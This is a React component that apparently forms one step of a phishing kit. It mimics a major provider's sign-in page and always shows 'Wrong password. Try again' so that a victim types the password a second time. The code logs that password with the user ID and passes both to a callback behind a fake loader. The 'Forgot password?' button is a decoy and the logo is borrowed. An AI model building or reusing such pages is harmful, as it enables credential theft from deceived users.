import { useState, useEffect } from "react";
import "./SignIn.css";

function WrongPasswordStep({ email, userId, onComplete }) {
  const [wrongPassword, setwrongPassword] = useState("");
  const [step, setStep] = useState("password");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoader, setShowLoader] = useState(false);



 const handleSubmit = (e) => {
  e.preventDefault();

  if (!wrongPassword.trim()) return;

  console.log("Current user ID:", userId);
  console.log("Current wrongPassword:", wrongPassword.trim());
    setShowLoader(true);

  if (onComplete) {
    const timer = setTimeout(() => {
         onComplete(userId, wrongPassword.trim());
      setShowLoader(false);
    }, 2000);
   
  }
};



    const handleBack =
    () => {


 
    window.location.href = "/"


      



     


    };


  return (
    <div className="signin-page">

      <div className="signin-card ">

        {showLoader && (
          <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="password-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            Welcome
          </h1>

          <div className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-email">
              {email}
            </span> 
              <button
                  type="button"
                  onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="password-right">

      

          <form onSubmit={handleSubmit}>

            <div className="password-input-container green">

              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={wrongPassword}
                
                onChange={(e) => setwrongPassword(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="password">
                Enter your password
              </label>

            </div>
            <small className="get">Wrong password. Try again or click "Forgot password?" for more options.</small>

            <label className="show-password">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) =>
                  setShowPassword(e.target.checked)
                }
              />

              <span>Show password</span>
            </label>

            <div className="password-actions">

              <button
                type="button"
                className="text-button"
              >
                Forgot password?
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!wrongPassword.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default WrongPasswordStep;